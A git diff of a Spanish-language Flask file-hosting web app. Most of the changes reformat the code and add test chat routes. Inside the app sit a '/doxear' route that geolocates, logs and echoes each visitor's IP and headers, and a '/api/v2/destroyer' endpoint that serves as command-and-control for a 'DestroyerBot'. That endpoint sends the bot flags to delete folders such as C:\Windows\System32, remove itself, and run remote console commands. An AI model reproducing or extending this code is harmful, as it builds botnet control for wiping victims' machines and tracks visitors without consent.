@@ -1,6 +1,9 @@
 from os import system
-import os, signal, traceback
-import requests, json
+import os
+import signal
+import traceback
+import requests
+import json
 from werkzeug.utils import secure_filename
 from Modules.SENDMAIL import SEND_MAIL
 from Modules.TOOLSQL import (
@@ -35,7 +38,10 @@ from flask_socketio import SocketIO, emit, send
 # from flask_cors import CORS, cross_origin
 import sqlite3
 from Modules import CONFIG
-import jwt, datetime, time, sys
+import jwt
+import datetime
+import time
+import sys
 
 from dotenv import load_dotenv
 
@@ -53,7 +59,7 @@ app.config["UPLOAD_FOLDER"] = CONFIG.RUTE
 log = logging.getLogger("WEB")
 load_dotenv("config.env")
 
-VERSION = "v0.2.3b"
+VERSION = "v0.2.5b"
 log.info(f"SERVIDOR INICIADO EN: [{CONFIG.MY_OS}] [{VERSION}]")
 CONNECTION_TEST()
 
@@ -66,7 +72,7 @@ def index():
     ip_client = request.headers.get("X-Real-IP")
     try:
         try:
-            uid= session["user"]
+            uid = session["user"]
             suid = SEARCH_DB("ID", uid)
             uss = suid[1]
             token = session["token"]
@@ -75,13 +81,14 @@ def index():
             uss = None
             token = None
             sessions = False
-            
+
         if sessions == False:
             log.debug(f"[{ip_client}] [/ ] No hay usuario en sesion")
-            return render_template("index2.html") 
+            return render_template("index2.html")
         else:
             try:
-                verific = jwt.decode(token, app.config.get("SECRET_KEY"), algorithms=["HS256"])
+                verific = jwt.decode(jwt=str(token), key=str(app.config.get(
+                    "SECRET_KEY")), algorithms=["HS256"])
                 log.info(f"[{ip_client}] [/ ] Token valido [{uss}]")
                 return render_template("app/index.html", user=uss)
             except jwt.ExpiredSignatureError:
@@ -90,9 +97,10 @@ def index():
             except jwt.InvalidTokenError:
                 log.debug(f"[{ip_client}] [/ ] Token invalido")
                 return redirect(url_for("login"))
-                
+
     except Exception as e:
-        log.error(f"[{ip_client}] [/ ] ERROR[0001]: {e} [{traceback.format_exc()}]")
+        log.error(
+            f"[{ip_client}] [/ ] ERROR[0001]: {e} [{traceback.format_exc()}]")
         return render_template("index2.html")
 
 
@@ -106,40 +114,44 @@ def login():
             key = app.config.get("SECRET_KEY")
             if email.__contains__('"'):
                 ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
-                log.debug(f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos [comillas]")
+                log.debug(
+                    f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos [comillas]")
                 return render_template("auth/log-in_layout.html", ERROR2=ERROR)
             if VALIDAR(email, passw, key) == True:
                 if email.__contains__("@"):
                     TheUser = SEARCH_DB("EMAIL", email)
                 else:
-                    TheUser = SEARCH_DB("USER", email)          
-                    
+                    TheUser = SEARCH_DB("USER", email)
+
                 data_token = {
-                        "exp": datetime.datetime.utcnow()
-                        + datetime.timedelta(days=30, minutes=13, seconds=0),
-                        "iat": datetime.datetime.utcnow(),
-                        "EMAIL": TheUser[2]}
+                    "exp": datetime.datetime.utcnow()
+                    + datetime.timedelta(days=30, minutes=13, seconds=0),
+                    "iat": datetime.datetime.utcnow(),
+                    "EMAIL": TheUser[2]}
                 thetoken = jwt.encode(
-                        data_token,
-                        app.config.get("SECRET_KEY"),
-                        algorithm="HS256")
-                
+                    data_token,
+                    app.config.get("SECRET_KEY"),
+                    algorithm="HS256")
+
                 session["user"] = TheUser[0]
                 session["token"] = thetoken
-                        
+
                 if TheUser[4] != "True":
                     return redirect(url_for("EmailSend", email=TheUser[2]))
-                        
-                log.info(f"[{ip_client}] [/login ] Usuario [{TheUser[1]}] logueado correctamente")
+
+                log.info(
+                    f"[{ip_client}] [/login ] Usuario [{TheUser[1]}] logueado correctamente")
                 return redirect(url_for("index"))
             else:
                 ERROR = "USUARIO/CORREO O CONTRASEÑA INCORRECTOS, SI NO RECUERDA SU CONTRASEÑA CLICk "
-                log.debug(f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos")
+                log.debug(
+                    f"[{ip_client}] [/login ] Usuario/Correo/Contraseña incorrectos")
                 return render_template("auth/log-in_layout.html", ERROR=ERROR)
-   
+
         except Exception as e:
             ERROR = "Ups algo salio mal, intentalo de nuevo"
-            log.error(f"[{ip_client}] [/login ] ERROR[0002]: {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/login ] ERROR[0002]: {e} [{traceback.format_exc()}]")
             return render_template("auth/log-in_layout.html", ERROR2=ERROR)
 
     else:
@@ -157,33 +169,39 @@ def regist():
             passw = request.form.get("passw")
             if username.__contains__('"'):
                 ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
-                log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]")
+                log.debug(
+                    f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]")
                 return render_template("auth/sign-up_layout.html", ERROR2=ERROR)
-            
+
             elif username.__contains__("@"):
                 ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER @"
-                log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [@]")
+                log.debug(
+                    f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [@]")
                 return render_template("auth/sign-up_layout.html", ERROR2=ERROR)
-                
+
             elif email.__contains__('"'):
                 ERROR = "EL USUARIO/CORREO NO PUEDE CONTENER COMILLAS"
-                log.debug(f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]")
+                log.debug(
+                    f"[{ip_client}] [/regist ] Usuario/Correo/Contraseña incorrectos [comillas]")
                 return render_template("auth/sign-up_layout.html", ERROR2=ERROR)
-            
-            else:      
+
+            else:
                 EPASSW = ENCRIPT(passw, app.config.get("SECRET_KEY"))
                 response = INSERT_DB(username, email, EPASSW)
-                
+
                 if response == "USUARIO [{usuario}] CREADO CORRECTAMENTE":
-                    log.info(f"[{ip_client}] [/regist ] Usuario {username} creado correctamente")
+                    log.info(
+                        f"[{ip_client}] [/regist ] Usuario {username} creado correctamente")
                     return redirect(url_for("EmailSend", email=email))
                 else:
-                    log.debug(f"[{ip_client}] [/regist ] Usuario {username} NO CREADO {response}")
+                    log.debug(
+                        f"[{ip_client}] [/regist ] Usuario {username} NO CREADO {response}")
                     return render_template("auth/sign-up_layout.html", ERROR=response)
-                
+
         except Exception as e:
             ERROR = f"Ups algo salio mal, intentalo de nuevo"
-            log.error(f"[{ip_client}] [/regist ] ERROR[0003]: {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/regist ] ERROR[0003]: {e} [{traceback.format_exc()}]")
             return render_template("auth/sign-up_layout.html", ERROR2=ERROR)
     else:
         log.debug(f"[{ip_client}] [/regist ] [metodo GET]")
@@ -209,24 +227,26 @@ def EmailSend():
             user = SEARCH_DB("EMAIL", email)
             if user == None:
                 Error = f'No se a registrado una cuenta con el correo electronico "{email}" en nuestros servidores, si no tiene una cuenta creela'
-                log.info(f"[{ip_client}] [/EmailSend ] Correo [{email}] no existe")
-                return render_template("auth/EmailSend.html",Error=Error)
+                log.info(
+                    f"[{ip_client}] [/EmailSend ] Correo [{email}] no existe")
+                return render_template("auth/EmailSend.html", Error=Error)
             code = C_EMAIL_VAL(user[1])
             if code == True:
                 Error = f'El correo "{email}" ya fue confirmado anteriormente'
-                log.info(f"[{ip_client}] [/EmailSend ] Correo [{email}] ya fue confirmado anteriormente")
-                return render_template("auth/EmailSend.html",Error=Error)
-                
+                log.info(
+                    f"[{ip_client}] [/EmailSend ] Correo [{email}] ya fue confirmado anteriormente")
+                return render_template("auth/EmailSend.html", Error=Error)
+
             datos_send_token = {
-                    "user": user[1],
-                    "email": email,
-                    "code": code}
-                
+                "user": user[1],
+                "email": email,
+                "code": code}
+
             token = jwt.encode(
-                    datos_send_token,
-                    app.config.get("SECRET_KEY"),
-                    algorithm="HS256")
-                
+                datos_send_token,
+                app.config.get("SECRET_KEY"),
+                algorithm="HS256")
+
             subject = f"Confirmación de cuenta [{code}]"
             message = f"""<html>
                 <head>
@@ -249,13 +269,15 @@ def EmailSend():
                 </h2>
                 </body>
                 </html>"""
-                
+
             SEND_MAIL(email, subject, message)
-            log.info(f"[{ip_client}] [/EmailSend ] Usuario [{user[1]}] envio correo a [{email}] para confirmar su cuenta")
+            log.info(
+                f"[{ip_client}] [/EmailSend ] Usuario [{user[1]}] envio correo a [{email}] para confirmar su cuenta")
             return redirect(url_for("EmailConfirm", email=email))
         except Exception as e:
-            log.error(f"[{ip_client}] [/EmailSend ] ERROR[0004]: {e} [{traceback.format_exc()}]")
-            Error2 =f"Ups estamos teniendo problemas para enviar el correo, por favor intentelo mas tarde"
+            log.error(
+                f"[{ip_client}] [/EmailSend ] ERROR[0004]: {e} [{traceback.format_exc()}]")
+            Error2 = f"Ups estamos teniendo problemas para enviar el correo, por favor intentelo mas tarde"
             return render_template("auth/EmailSend.html", Error2=Error2)
     else:
         return render_template("auth/EmailSend.html")
@@ -270,63 +292,87 @@ def EmailConfirm():
             code = request.form.get("code")
             response = EMAIL_VAL(email, code, True)
             if response == True:
-                log.info(f"[{ip_client}] [/EmailConfirm ] Correo [{email}] a activado su cuenta")
+                log.info(
+                    f"[{ip_client}] [/EmailConfirm ] Correo [{email}] a activado su cuenta")
                 return redirect(url_for("index"))
             if response == False:
                 ERROR = f"EL CODIGO DE ACTIVACION ES INCORRECTO, SI NO A RESIVIDO UN CORREO PUEDE VOLVER A INTENTARLO"
-                log.debug(f"[{ip_client}] [/EmailConfirm ] Correo [{email}] utilizo un codigo incorrecto")
+                log.debug(
+                    f"[{ip_client}] [/EmailConfirm ] Correo [{email}] utilizo un codigo incorrecto")
                 return render_template("auth/EmailConfirm.html", Error=ERROR)
         except Exception as e:
-            log.error(f"[{ip_client}] [/EmailConfirm ] ERROR[0005]: {e} [{traceback.format_exc()}]")
-            Error2 =f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
+            log.error(
+                f"[{ip_client}] [/EmailConfirm ] ERROR[0005]: {e} [{traceback.format_exc()}]")
+            Error2 = f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
             return render_template("auth/EmailConfirm.html", Error2=Error2)
     else:
         try:
             if request.args.get("email"):
                 email = request.args.get("email")
-                log.debug(f"[{ip_client}] [/EmailConfirm ] Usuario [{email}] solicito confirmacion de cuenta")
+                log.debug(
+                    f"[{ip_client}] [/EmailConfirm ] Usuario [{email}] solicito confirmacion de cuenta")
                 return render_template("auth/EmailConfirm.html", correo=email)
-                
+
             if request.args.get("token"):
                 try:
                     token = request.args.get("token")
                     verific = jwt.decode(
-                    token, app.config.get("SECRET_KEY"), algorithms=["HS256"])
-                    
+                        token, app.config.get("SECRET_KEY"), algorithms=["HS256"])
+
                     user = verific["user"]
                     email = verific["email"]
                     code = verific["code"]
                     user_data = SEARCH_DB("USER", user)
                     if user_data == None:
-                        log.warning(f"[{ip_client}] [/EmailConfirm ] WARNING[0001] user [{user}], email [{email}] intento falsear el token")
+                        log.warning(
+                            f"[{ip_client}] [/EmailConfirm ] WARNING[0001] user [{user}], email [{email}] intento falsear el token")
                         return redirect(url_for("EmailSend"))
-                    
-                    response = EMAIL_VAL(email,code, True)
-                    if response == True:            
-                        log.info(f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data[1]}] cuenta activada")
+
+                    response = EMAIL_VAL(email, code, True)
+                    if response == True:
+                        log.info(
+                            f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data[1]}] cuenta activada")
                         return redirect(url_for("index"))
                     else:
-                        log.debug(f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data[1]}] codigo incorrecto")
+                        log.debug(
+                            f"[{ip_client}] [/EmailConfirm ] Usuario [{user_data[1]}] codigo incorrecto")
                         return redirect(url_for("EmailSend"))
-                    
+
                 except jwt.ExpiredSignatureError:
-                    log.debug(f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token expirado")
+                    log.debug(
+                        f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token expirado")
                     return redirect(url_for("EmailSend"))
                 except jwt.InvalidTokenError:
-                    log.debug(f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token invalido")
+                    log.debug(
+                        f"[{ip_client}] [/EmailConfirm ] [DEBUG] Token invalido")
                     return redirect(url_for("EmailSend"))
                 except Exception as e:
-                    log.error(f"[{ip_client}] [/EmailConfirm ] ERROR[0006]: {e} [{traceback.format_exc()}]")
-                    Error2 =f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
+                    log.error(
+                        f"[{ip_client}] [/EmailConfirm ] ERROR[0006]: {e} [{traceback.format_exc()}]")
+                    Error2 = f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
                     return render_template("auth/EmailConfirm.html", Error2=Error2)
             else:
                 return redirect(url_for("EmailSend"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/EmailConfirm ] ERROR[0007]: {e} [{traceback.format_exc()}]")
-            Error2 =f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
+            log.error(
+                f"[{ip_client}] [/EmailConfirm ] ERROR[0007]: {e} [{traceback.format_exc()}]")
+            Error2 = f"Ups estamos teniendo problemas para activar su cuenta, por favor intentelo mas tarde"
             return render_template("auth/EmailConfirm.html", Error2=Error2)
-            
 
+
+@app.route("/tchat")
+def testchat():
+    return render_template("chat/chat1.html")
+
+
+@app.route("/tchat2")
+def testchat2():
+    return render_template("chat/chat2.html")
+
+
+@app.route("/tchat3")
+def testchat3():
+    return render_template("chat/chat3.html")
 
 
 @app.route("/favicon.ico")
@@ -340,7 +386,8 @@ def favicon():
             the_path = f"{CONFIG.SYSTEM_PATH}/static"
         return send_from_directory(the_path, "favicon.png", as_attachment=False)
     except Exception as e:
-        log.error(f"[{ip_client}] [/icon ] ERROR[0008]: {e} [{traceback.format_exc()}]")
+        log.error(
+            f"[{ip_client}] [/icon ] ERROR[0008]: {e} [{traceback.format_exc()}]")
         return redirect(url_for("index"))
 
 
@@ -356,7 +403,8 @@ def robots_txt():
         log.debug(f"[{ip_client}] [/robots.txt ] [OK]")
         return send_from_directory(the_path, "robots.txt", as_attachment=False)
     except Exception as e:
-        log.error(f"[{ip_client}] [/robots.txt ] ERROR[0009]: {e} [{traceback.format_exc()}]")
+        log.error(
+            f"[{ip_client}] [/robots.txt ] ERROR[0009]: {e} [{traceback.format_exc()}]")
         return redirect(url_for("index"))
 
 
@@ -372,7 +420,8 @@ def sitemap_xml():
         log.debug(f"[{ip_client}] [/sitemap.xml ] [OK]")
         return send_from_directory(the_path, "sitemap.xml", as_attachment=False)
     except Exception as e:
-        log.error(f"[{ip_client}] [/sitemap.xml ] ERROR[0010]: {e} [{traceback.format_exc()}]")
+        log.error(
+            f"[{ip_client}] [/sitemap.xml ] ERROR[0010]: {e} [{traceback.format_exc()}]")
         return redirect(url_for("index"))
 
 
@@ -382,7 +431,7 @@ def download():
     if request.args.get("file"):
         try:
             try:
-                uid= session["user"]
+                uid = session["user"]
                 suid = SEARCH_DB("ID", uid)
                 uss = suid[1]
                 token = session["token"]
@@ -407,13 +456,16 @@ def download():
                     )
                     return send_from_directory(the_path, archive, as_attachment=False)
                 except jwt.ExpiredSignatureError:
-                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token [{token}]")
+                    log.debug(
+                        f"[{ip_client}] [/download ] Usuario [{uss}] expirón token [{token}]")
                     return redirect(url_for("login"))
                 except jwt.InvalidTokenError:
-                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido [{token}]")
+                    log.debug(
+                        f"[{ip_client}] [/download ] Usuario [{uss}] token invalido [{token}]")
                     return redirect(url_for("login"))
                 except Exception as e:
-                    log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+                    log.error(
+                        f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                     return redirect(url_for("download"))
 
             else:
@@ -431,7 +483,8 @@ def download():
             )
             print(verific)
             archive = verific["archive"]
-            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
+            user_token = DESENCRIPT(
+                str(verific["user"]), app.config.get("SECRET_KEY"))
             suid = SEARCH_DB("ID", user_token)
             uss = suid[1]
             the_os = CONFIG.MY_OS
@@ -444,13 +497,16 @@ def download():
             )
             return send_from_directory(the_path, archive, as_attachment=False)
         except jwt.ExpiredSignatureError:
-            log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
+            log.debug(
+                f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
             return redirect(url_for("login"))
         except jwt.InvalidTokenError:
-            log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
+            log.debug(
+                f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
             return redirect(url_for("login"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("download"))
 
     elif request.args.get("f_file"):
@@ -460,7 +516,8 @@ def download():
                 the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
             )
             archive = verific["archive"]
-            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
+            user_token = DESENCRIPT(
+                str(verific["user"]), app.config.get("SECRET_KEY"))
             suid = SEARCH_DB("ID", user_token)
             uss = suid[1]
             the_os = CONFIG.MY_OS
@@ -473,18 +530,21 @@ def download():
             )
             return send_from_directory(the_path, archive, as_attachment=True)
         except jwt.ExpiredSignatureError:
-            log.debug(f"[{ip_client}] [/download ] Usuario {uss} expirón token {token}")
+            log.debug(
+                f"[{ip_client}] [/download ] Usuario {uss} expirón token {token}")
             return redirect(url_for("login"))
         except jwt.InvalidTokenError:
-            log.debug(f"[{ip_client}] [/download ] Usuario {uss} token invalido {token}")
+            log.debug(
+                f"[{ip_client}] [/download ] Usuario {uss} token invalido {token}")
             return redirect(url_for("login"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/download ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("download"))
     else:
         try:
             try:
-                uid= session["user"]
+                uid = session["user"]
                 suid = SEARCH_DB("ID", uid)
                 uss = suid[1]
                 token = session["token"]
@@ -525,7 +585,8 @@ def download():
                         )
                         file.append([archive, the_token, file_size])
                     sorted_file = sorted(file, key=lambda x: x[0])
-                    log.debug(f"[{ip_client}] [/download ] [method GET] Usuario {uss}")
+                    log.debug(
+                        f"[{ip_client}] [/download ] [method GET] Usuario {uss}")
                     return render_template(
                         "files/download.html",
                         user=uss,
@@ -535,18 +596,21 @@ def download():
                     )
 
                 except jwt.ExpiredSignatureError:
-                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
+                    log.debug(
+                        f"[{ip_client}] [/download ] Usuario [{uss}] expirón token")
                     return redirect(url_for("login"))
                 except jwt.InvalidTokenError:
-                    log.debug(f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
+                    log.debug(
+                        f"[{ip_client}] [/download ] Usuario [{uss}] token invalido")
                     return redirect(url_for("login"))
-            
+
             else:
                 log.debug(f"[{ip_client}] [/download ] Usuario no logueado")
                 return redirect(url_for("login"))
-            
+
         except Exception as e:
-            log.error(f"[{ip_client}] [/download ] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/download ] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("login"))
 
 
@@ -556,7 +620,7 @@ def upload():
     if request.method == "POST":
         try:
             try:
-                uid= session["user"]
+                uid = session["user"]
                 suid = SEARCH_DB("ID", uid)
                 uss = suid[1]
                 token = session["token"]
@@ -589,27 +653,33 @@ def upload():
 
                     file_path = the_path
                     file.save(file_path)
-                    log.info(f"[{ip_client}] [/upload ] Usuario [{uss}] subión archivo [{filename}]")
+                    log.info(
+                        f"[{ip_client}] [/upload ] Usuario [{uss}] subión archivo [{filename}]")
                     return redirect(url_for("download"))
                 except jwt.ExpiredSignatureError:
-                    log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}]  expirón token")
+                    log.debug(
+                        f"[{ip_client}] [/upload ] Usuario [{uss}]  expirón token")
                     return redirect(url_for("login"))
                 except jwt.InvalidTokenError:
-                    log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}]  token invalido")
+                    log.debug(
+                        f"[{ip_client}] [/upload ] Usuario [{uss}]  token invalido")
                     return redirect(url_for("login"))
                 except Exception as e:
-                    log.error(f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+                    log.error(
+                        f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
                     return redirect(url_for("login"))
             else:
-                log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
+                log.debug(
+                    f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                 return redirect(url_for("login"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/upload] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/upload] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("login"))
     else:
         try:
             try:
-                uid= session["user"]
+                uid = session["user"]
                 suid = SEARCH_DB("ID", uid)
                 uss = suid[1]
                 token = session["token"]
@@ -623,25 +693,31 @@ def upload():
                     verific = jwt.decode(
                         token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
                     )
-                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario {uss} logueado")
+                    log.debug(
+                        f"[{ip_client}] [/upload ] [method GET] Usuario {uss} logueado")
                     return render_template(
                         "files/upload.html", user=uss, space=CONFIG.Free_Space
                     )
 
                 except jwt.ExpiredSignatureError:
-                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] expirón token")
+                    log.debug(
+                        f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] expirón token")
                     return redirect(url_for("login"))
                 except jwt.InvalidTokenError:
-                    log.debug(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] token invalido")
+                    log.debug(
+                        f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] token invalido")
                     return redirect(url_for("login"))
                 except Exception as e:
-                    log.warning(f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] error {e}")
+                    log.warning(
+                        f"[{ip_client}] [/upload ] [method GET] Usuario [{uss}] error {e}")
                     return redirect(url_for("login"))
             else:
-                log.debug(f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
+                log.debug(
+                    f"[{ip_client}] [/upload ] Usuario [{uss}] no logueado")
                 return redirect(url_for("login"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/upload ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("login"))
 
 
@@ -655,7 +731,8 @@ def delete():
                 the_token, app.config.get("SECRET_KEY"), algorithms=["HS256"]
             )
             archive = verific["archive"]
-            user_token = DESENCRIPT(str(verific["user"]), app.config.get("SECRET_KEY"))
+            user_token = DESENCRIPT(
+                str(verific["user"]), app.config.get("SECRET_KEY"))
             suid = SEARCH_DB("ID", user_token)
             uss = suid[1]
             the_os = CONFIG.MY_OS
@@ -664,16 +741,20 @@ def delete():
             else:
                 the_path = f'{app.config.get("UPLOAD_FOLDER")}/{user_token}/{archive}'
             os.remove(the_path)
-            log.info(f"[{ip_client}] [/delete ] Usuario [{uss}] borrón archivo [{archive}]")
+            log.info(
+                f"[{ip_client}] [/delete ] Usuario [{uss}] borrón archivo [{archive}]")
             return redirect(url_for("download"))
         except jwt.ExpiredSignatureError:
-            log.debug(f"[{ip_client}] [/delete ] Usuario [{uss}] expirón token")
+            log.debug(
+                f"[{ip_client}] [/delete ] Usuario [{uss}] expirón token")
             return redirect(url_for("login"))
         except jwt.InvalidTokenError:
-            log.debug(f"[{ip_client}] [/delete ] Usuario [{uss}] token invalido")
+            log.debug(
+                f"[{ip_client}] [/delete ] Usuario [{uss}] token invalido")
             return redirect(url_for("login"))
         except Exception as e:
-            log.error(f"[{ip_client}] [/delete ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
+            log.error(
+                f"[{ip_client}] [/delete ] Usuario [{uss}] error {e} [{traceback.format_exc()}]")
             return redirect(url_for("login"))
     else:
         log.debug(f"[{ip_client}] [/delete ] [method GET]")
@@ -712,7 +793,7 @@ def contactar():
 @app.route("/conditions")
 def ter_y_co():
     return "en proceso"
-    #return render_template("auth/terms-conditions.html")
+    # return render_template("auth/terms-conditions.html")
 
 
 @app.route("/privacy")
@@ -771,17 +852,20 @@ def setcookie():
 def dev():
     return render_template("index.html")
 
+
 @app.route("/doxear", methods=["POST", "GET"])
 def doxear():
     client_ip = request.headers.get("X-Real-IP")
     headers = request.headers
     localis = requests.get(f"http://ip-api.com/json/{client_ip}")
     localis = localis.json()
-    log.critical(f"[/doxear ] [method GET] [ip] {client_ip} [headesrs] {headers} [localis] {localis} ")
-    
+    log.critical(
+        f"[/doxear ] [method GET] [ip] {client_ip} [headesrs] {headers} [localis] {localis} ")
+
     return f"<h1>Hola {client_ip} </h1> <h2> Headers: {headers} </h2> <h3> Localis: {localis} </h3>"
 
 ################### API/v1 #######################
+
 
 @app.route("/api/auth", methods=["POST", "GET"])
 def apiauth_v1():
@@ -862,7 +946,9 @@ def apimsg():
 
 #################### API/v2 ######################
 
-#Auth v2
+# Auth v2
+
+
 @app.route("/api/v2/auth", methods=["POST", "GET"])
 def apiauth_v2():
     try:
@@ -875,42 +961,46 @@ def apiauth_v2():
 def destroyer_bot():
     ip_client = request.headers.get("X-Real-IP")
     try:
-        if request.method == "POST":  
+        if request.method == "POST":
             user_agent = request.headers.get("User-Agent")
             if user_agent == "DestroyerBot":
                 try:
                     data = request.get_json()
                     if data["Response"] == True:
                         # Registrar el mensaje enviado por el bot
-                        log.warning(f"[/api/v2/destroyer ] [method POST] Mensaje recibido desde {ip_client}: {data['Response_Text']}")
+                        log.warning(
+                            f"[/api/v2/destroyer ] [method POST] Mensaje recibido desde {ip_client}: {data['Response_Text']}")
                 except:
                     data = None
-                
-                    
+
                 response_data = {
-                "DestroyerCall": False,
-                "kill_Personal_Carpet": False,
-                "Kill_Spesific_Folder": False,
-                "Folders_Route": ["C:\\Windows\\System32"],
-                "Delete_Bot": False,
-                "Stop_Bot": False,
-                "Execute_Console": True,
-                "Console_command": ["ping google.com -c3"]
+                    "DestroyerCall": False,
+                    "kill_Personal_Carpet": False,
+                    "Kill_Spesific_Folder": False,
+                    "Folders_Route": ["C:\\Windows\\System32"],
+                    "Delete_Bot": False,
+                    "Stop_Bot": False,
+                    "Execute_Console": True,
+                    "Console_command": ["ping google.com -c3"]
                 }
-                log.info(f"[/api/v2/destroyer ] [method POST] DestroyerBot {ip_client} con User-Agent {user_agent}, {data}")
+                log.info(
+                    f"[/api/v2/destroyer ] [method POST] DestroyerBot {ip_client} con User-Agent {user_agent}, {data}")
                 return jsonify(response_data)
             else:
                 user_agent = request.headers.get("User-Agent")
-                log.warning(f"[/api/v2/destroyer ] [method POST] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
+                log.warning(
+                    f"[/api/v2/destroyer ] [method POST] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
                 return jsonify({"error": "Forbidden"}), 403
         else:
             ip_client = request.headers.get("X-Real-IP")
-            log.warning(f"[/api/v2/destroyer ] [method GET] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
+            log.warning(
+                f"[/api/v2/destroyer ] [method GET] Acceso no autorizado desde {ip_client} con User-Agent {user_agent}")
             headers = request.headers
-            return f"{headers}"        
-        
+            return f"{headers}"
+
     except Exception as e:
-        log.error(f"[/api/v2/destroyer ] Error al procesar la petición: {e} [{traceback.format_exc()}]")
+        log.error(
+            f"[/api/v2/destroyer ] Error al procesar la petición: {e} [{traceback.format_exc()}]")
         return jsonify({"error": "Internal server error"}), 500
 
 
